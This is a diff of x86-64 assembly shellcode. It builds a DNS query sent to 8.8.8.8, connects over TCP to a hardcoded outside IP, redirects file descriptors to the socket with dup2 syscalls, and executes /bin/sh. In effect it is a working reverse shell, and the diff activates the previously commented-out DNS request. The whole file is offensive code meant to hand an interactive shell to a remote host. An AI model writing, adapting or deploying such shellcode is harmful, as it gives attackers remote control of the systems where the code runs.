@@ -7,14 +7,6 @@
   
 global main
 
-section .data
-   ; message db 'hello'
-   ; sock    dw 2
-    ;        db 10h , 00h 
-    ;        db 7fh, 0h, 0h, 01h
-    ;        db 0,0,0,0,0,0,0,0
-
-
 section .text
        
 
@@ -29,19 +21,19 @@ main:
         mov rdi, rax                            ; sockfd
 ; ####################### DNS REQUEST
 
-     ;    mov rax, 0x01000100006d6f63
-     ;   push rax
-     ;   mov rax, 0x0376656474696b74
-     ;   push rax
-     ;   mov rax, 0x6f6f720a00000000
-     ;   push rax
-     ;   mov rax, 0x000001000001AAAA
-     ;   push rax
+       mov rax, 0x01000100006d6f63
+       push rax
+       mov rax, 0x0376656474696b74
+       push rax
+       mov rax, 0x6f6f720a00000000
+       push rax
+       mov rax, 0x000001000001AAAA
+       push rax
 ; ############################### 
 
         mov rsi ,rsp
         mov rdx, 32 ; len of bytes    ; Google IP  port 53  INET Family       
-        mov rax, 0x0101010135000002   ; 8.8.8.8.8 - 0x35 - 00 00 02 
+        mov rax, 0x0808080835000002   ; 8.8.8.8.8 - 0x35 - 00 00 02 
         push rax
         mov rax, 44                             ; Send Syscall
       
@@ -70,7 +62,6 @@ main:
 
     ; Set up for TCP Session    
 
-;         ;7F 00 00 01
         mov rax,  0xbf6d24b0
         ;mov rax, 0x0100007F                   ; UNCOMENT FOR TESTING! ; Push IP 127.0.0.1
         push rax                                ; Push our saved IP!
@@ -97,7 +88,7 @@ main:
         syscall
 
         xor rsi, rsi
-loop:
+
         mov al, 33
         syscall
         inc rsi
@@ -106,12 +97,8 @@ loop:
         syscall
         inc rsi
 
-
-
-        ;jle loop
-
         xor rax, rax
-        mov rdi, 0x68732f6e69622f2f
+        mov rdi, 0x68732f6e69622f2f   ; /bin/sh
         xor rsi, rsi
         push rsi
         push rdi
